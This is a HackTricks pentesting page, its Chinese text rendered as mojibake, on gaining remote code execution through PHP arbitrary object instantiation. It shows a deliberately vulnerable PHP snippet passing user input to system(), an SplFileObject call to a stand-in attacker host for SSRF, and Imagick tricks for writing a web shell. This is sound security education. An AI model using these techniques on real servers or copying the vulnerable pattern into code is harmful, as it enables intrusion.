# PHP - RCEæ»¥ç”¨å¯¹è±¡åˆ›å»ºï¼šnew $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç®€ä»‹

åœ¨å¯ä»¥åˆ›å»ºæ–°çš„ä»»æ„å¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚`new $_GET["a"]($_GET["b"])`ï¼Œä½ å¯èƒ½èƒ½å¤Ÿè·å¾—RCEï¼Œå¹¶ä¸”[**è¿™ç¯‡æ–‡ç« **](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)æ­ç¤ºäº†ä¸åŒçš„è·å¾—RCEçš„æ–¹æ³•ã€‚

## é€šè¿‡è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å®ç°RCE

åœ¨æ„é€ `new $a($b)`ä¸­ï¼Œ**å˜é‡`$a`ä»£è¡¨å°†è¦åˆ›å»ºå¯¹è±¡çš„ç±»å**ï¼Œå˜é‡**`$b`ä»£è¡¨å°†ä¼ é€’ç»™å¯¹è±¡æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°**ã€‚

å¦‚æœ`$a`å’Œ`$b`æ¥è‡ªGET/POSTï¼Œå®ƒä»¬å¯ä»¥æ˜¯**å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„**ã€‚å¦‚æœå®ƒä»¬æ¥è‡ª**JSON**æˆ–å…¶ä»–åœ°æ–¹ï¼Œå®ƒä»¬**å¯èƒ½å…·æœ‰å…¶ä»–ç±»å‹**ï¼Œæ¯”å¦‚å¯¹è±¡æˆ–å¸ƒå°”å€¼ã€‚

è®©æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
åœ¨è¿™æ®µä»£ç ä¸­ï¼Œä½ å¯ä»¥å°†`$a`è®¾ç½®ä¸º`App`æˆ–`App2`ï¼Œå°†`$b`è®¾ç½®ä¸º`uname -a`ã€‚ä¹‹åï¼Œå‘½ä»¤`uname -a`å°†è¢«æ‰§è¡Œã€‚

å½“ä½ çš„åº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è¿™æ ·çš„å¯åˆ©ç”¨ç±»ï¼Œæˆ–è€…ä½ éœ€è¦çš„ç±»åœ¨ä¸€ä¸ªä¸è¢«æ˜“å—æ”»å‡»çš„ä»£ç åŒ…å«çš„å•ç‹¬æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥æŸ¥çœ‹è‡ªåŠ¨åŠ è½½å‡½æ•°ã€‚

**è‡ªåŠ¨åŠ è½½å‡½æ•°**æ˜¯é€šè¿‡æ³¨å†Œå›è°ƒå‡½æ•°`spl_autoload_register`æˆ–å®šä¹‰`__autoload`æ¥è®¾ç½®çš„ã€‚å½“å°è¯•åˆ›å»ºä¸€ä¸ªæœªçŸ¥ç±»çš„å®ä¾‹æ—¶ï¼Œå®ƒä»¬ä¼šè¢«è°ƒç”¨ã€‚
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
æ ¹æ®PHPç‰ˆæœ¬å’Œè‡ªåŠ¨åŠ è½½å‡½æ•°ä¸­çš„ä»£ç ï¼Œå¯èƒ½å­˜åœ¨ä¸€äº›é€šè¿‡è‡ªåŠ¨åŠ è½½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ–¹æ³•ã€‚

## é€šè¿‡å†…ç½®ç±»å®ç°RCE

å½“æ‚¨æ²¡æœ‰è‡ªå®šä¹‰ç±»å’Œè‡ªåŠ¨åŠ è½½æ—¶ï¼Œæ‚¨å¯ä»¥ä»…ä¾èµ–**å†…ç½®çš„PHPç±»**ã€‚

PHPå†…ç½®ç±»çš„æ•°é‡åœ¨100åˆ°200ä¹‹é—´ï¼Œå…·ä½“å–å†³äºPHPç‰ˆæœ¬å’Œå·²å®‰è£…çš„æ‰©å±•ã€‚å¯ä»¥ä½¿ç”¨`get_declared_classes`å‡½æ•°åˆ—å‡ºæ‰€æœ‰å†…ç½®ç±»ï¼ŒåŒ…æ‹¬è‡ªå®šä¹‰ç±»ï¼š
```php
var_dump(get_declared_classes());
```
å¯ä»¥é€šè¿‡[åå°„API](https://www.php.net/manual/en/book.reflection.php)æ‰¾åˆ°å…·æœ‰æœ‰ç”¨æ„é€ å‡½æ•°çš„ç±»ã€‚

ä½¿ç”¨åå°„APIæ˜¾ç¤ºæ„é€ å‡½æ•°åŠå…¶å‚æ•°ï¼š[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

å¦‚æœæ‚¨æ§åˆ¶**å¤šä¸ªæ„é€ å‡½æ•°å‚æ•°å¹¶ä¸”å¯ä»¥éšåè°ƒç”¨ä»»æ„æ–¹æ³•**ï¼Œåˆ™æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨åªèƒ½ä¼ é€’**ä¸€ä¸ªå‚æ•°å¹¶ä¸”æ²¡æœ‰å¯¹åˆ›å»ºçš„å¯¹è±¡è¿›è¡Œä»»ä½•è°ƒç”¨**ï¼Œå‡ ä¹æ²¡æœ‰ä»€ä¹ˆåŠæ³•ã€‚

æˆ‘åªçŸ¥é“ä¸‰ç§æ–¹æ³•å¯ä»¥ä»`new $a($b)`ä¸­è·å–ä¸€äº›ä¸œè¥¿ã€‚

### **SSRF + Pharååºåˆ—åŒ–**

`SplFileObject`ç±»å®ç°äº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå…è®¸è¿æ¥åˆ°ä»»ä½•æœ¬åœ°æˆ–è¿œç¨‹URLï¼š
```
new SplFileObject('http://attacker.com/');
```
è¿™å…è®¸SSRFã€‚æ­¤å¤–ï¼ŒPHP < 8.0ä¸­çš„SSRFå¯ä»¥é€šè¿‡Pharåè®®çš„æŠ€æœ¯è½¬åŒ–ä¸ºååºåˆ—åŒ–ã€‚

### **åˆ©ç”¨PDOs**

PDOç±»æœ‰å¦ä¸€ä¸ªæœ‰è¶£çš„æ„é€ å‡½æ•°ï¼š
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO`æ„é€ å‡½æ•°æ¥å—DSNå­—ç¬¦ä¸²ï¼Œå…è®¸æˆ‘ä»¬ä½¿ç”¨å·²å®‰è£…çš„æ•°æ®åº“æ‰©å±•è¿æ¥åˆ°ä»»ä½•æœ¬åœ°æˆ–è¿œç¨‹æ•°æ®åº“ã€‚ä¾‹å¦‚ï¼ŒSQLiteæ‰©å±•å¯ä»¥åˆ›å»ºç©ºæ–‡ä»¶ã€‚

### **SoapClient/SimpleXMLElement XXE**

åœ¨PHP â‰¤ 5.3.22å’Œâ‰¤ 5.4.12ä¸­ï¼ŒSoapClientçš„æ„é€ å‡½æ•°**å®¹æ˜“å—åˆ°XXEæ”»å‡»**ã€‚SimpleXMLElementçš„æ„é€ å‡½æ•°ä¹Ÿå®¹æ˜“å—åˆ°XXEæ”»å‡»ï¼Œä½†éœ€è¦libxml2 < 2.9ã€‚

## é€šè¿‡Imagickæ‰©å±•å®ç°RCE

æ£€æŸ¥æ‚¨å°è¯•åˆ©ç”¨çš„**é¡¹ç›®çš„ä¾èµ–é¡¹**ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°å¯ä»¥æ»¥ç”¨ä»¥åˆ›å»ºæ–°å¯¹è±¡æ¥æ‰§è¡Œå‘½ä»¤çš„**æ–°ç±»**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‘ç°Imagickå¯¹æ­¤éå¸¸æœ‰ç”¨ã€‚

### VIDè§£æå™¨

VIDè§£æå™¨å…è®¸åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä»»æ„è·¯å¾„ä¸Šç¼–å†™ä»»æ„å†…å®¹ï¼Œè¿™å°†å…è®¸æ”»å‡»è€…åœ¨å¯ä»ç½‘é¡µè®¿é—®çš„æ–‡ä»¶å¤¹ä¸­ç¼–å†™PHPshellå¹¶è·å¾—RCEã€‚

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VIDè§£æå™¨ + æ–‡ä»¶ä¸Šä¼ 

å½“æ–‡ä»¶ä¸Šä¼ åˆ°PHPæ—¶ï¼Œå®ƒä¼šä¸´æ—¶å­˜å‚¨åœ¨`/tmp/phpXXXXXX`ä¸­ã€‚Imagickçš„VIDè§£æå™¨ä¸**msl**åè®®å…è®¸åœ¨æ–‡ä»¶è·¯å¾„ä¸­**æŒ‡å®šé€šé…ç¬¦**ï¼ˆå› æ­¤å¯ä»¥è½»æ¾è®¿é—®ä¸´æ—¶ä¸Šä¼ çš„æ–‡ä»¶ï¼‰å¹¶å°†å…¶**å¤åˆ¶åˆ°ä»»æ„ä½ç½®**ã€‚\
è¿™æ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­è·å–ä»»æ„æ–‡ä»¶å†™å…¥çš„å¦ä¸€ç§æ–¹æ³•ï¼š

![](<../../../.gitbook/assets/image (159).png>)

### PHPå´©æºƒ + æš´åŠ›ç ´è§£

[**åŸå§‹å†™ä½œ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)è§£é‡Šäº†é€šè¿‡**ä¸Šä¼ å…·æœ‰ç‰¹å®šå†…å®¹çš„æ–‡ä»¶**å¹¶ä½¿**æœåŠ¡å™¨åœ¨åˆ é™¤è¯¥æ–‡ä»¶ä¹‹å‰å´©æºƒ**ï¼Œç„¶å**æš´åŠ›ç ´è§£ä¸´æ—¶æ–‡ä»¶çš„åç§°**ç›´åˆ°**Imagickæ‰§è¡Œä»»æ„PHPä»£ç **çš„å¦ä¸€ç§æ–¹æ³•ã€‚

ç„¶è€Œï¼Œæ˜¾ç„¶**å´©æºƒæŠ€å·§**åªåœ¨æ—§ç‰ˆæœ¬çš„ImageMagickä¸­**æœ‰æ•ˆ**ã€‚

## å‚è€ƒèµ„æ–™

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
